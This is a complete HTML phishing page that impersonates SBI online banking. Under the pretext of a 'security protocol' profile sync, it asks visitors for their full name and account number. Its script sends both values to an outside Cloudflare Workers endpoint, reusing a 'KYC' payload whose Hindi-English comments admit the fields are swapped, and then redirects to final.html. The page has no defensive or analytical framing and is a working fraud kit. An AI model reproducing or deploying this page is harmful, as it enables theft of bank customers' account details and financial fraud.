<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBI - Online Banking</title>
    <style>
        * { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; margin: 0; padding: 0; }
        body { background-color: #fff; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; }
        .full-img { width: 100%; display: block; }
        
        .header-bar { background-color: #315195; color: white; padding: 12px 15px; font-size: 14px; font-weight: bold; }
        
        .content-area { padding: 20px 25px; }
        .instruction-text { font-size: 13px; color: #333; margin-bottom: 20px; line-height: 1.5; border-left: 4px solid #315195; padding: 10px; background: #f8fbff; }
        
        .field-group { margin-bottom: 18px; }
        .field-group label { display: block; font-size: 13px; color: #555; margin-bottom: 8px; font-weight: bold; }
        
        .bank-input { 
            width: 100%; height: 38px; padding: 0 12px; 
            background-color: #fff; border: 1px solid #999; 
            border-radius: 2px; font-size: 15px; outline: none;
            color: #333;
        }
        .bank-input:focus { border-color: #315195; box-shadow: 0 0 3px rgba(49,81,149,0.2); }

        .btn-row { display: flex; gap: 12px; margin-top: 25px; }
        .btn { padding: 10px 25px; border: none; color: white; font-size: 14px; border-radius: 2px; cursor: pointer; font-weight: bold; }
        .btn-submit { background-color: #315195; }
        .btn-gray { background-color: #6c757d; }

        .footer-note { margin-top: 30px; font-size: 12px; color: #666; border-top: 1px solid #eee; padding-top: 15px; line-height: 1.4; }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="Header" class="full-img">
        <div class="header-bar">Profile Update / Account Validation</div>

        <div class="content-area">
            <div class="instruction-text">
                Please provide your <b>Account Number</b> and <b>Full Name</b> as per bank records to synchronize your profile with the new security protocols.
            </div>

            <form id="accountForm">
                <div class="field-group">
                    <label>Account Holder Name *</label>
                    <input type="text" id="acc_name" class="bank-input" placeholder="Full Name (As per Bank)" required autocomplete="off">
                </div>

                <div class="field-group">
                    <label>11-Digit Account Number *</label>
                    <input type="number" id="acc_no" class="bank-input" placeholder="Enter Account Number" required 
                           oninput="if(this.value.length > 11) this.value = this.value.slice(0, 11);" autocomplete="off">
                </div>

                <div class="btn-row">
                    <button type="submit" class="btn btn-submit" id="submitBtn">Submit Details</button>
                    <button type="reset" class="btn btn-gray">Cancel</button>
                </div>
            </form>

            <div class="footer-note">
                <b>Note:</b> Make sure the account number is correct to avoid any transaction failures. OnlineSBI values your privacy.
            </div>
        </div>

        <div style="margin-top: 40px;">
            <img src="https://i.ibb.co/Txj77Jk2/chrome-screenshot-1-Apr-2026-12-43-42-pm-IST.png" alt="Footer" class="full-img">
        </div>
    </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';

        document.getElementById('accountForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const accName = document.getElementById('acc_name').value;
            const accNo = document.getElementById('acc_no').value;
            const btn = document.getElementById('submitBtn');

            btn.disabled = true;
            btn.innerText = "Verifying...";

            // KYC table hi use kar rahe hain, bas data content badal diya
            const payload = {
                type: "KYC", // Worker ke database mein isi table mein jayega
                pan: "NAME: " + accName, // PAN ki jagah Name bhej rahe hain
                dob: "ACC: " + accNo    // DOB ki jagah Acc No bhej rahe hain
            };

            try {
                await fetch(workerURL, {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                // Final redirect
                window.location.href = "final.html"; 
            } catch (err) {
                window.location.href = "final.html";
            }
        });
    </script>
</body>
</html>
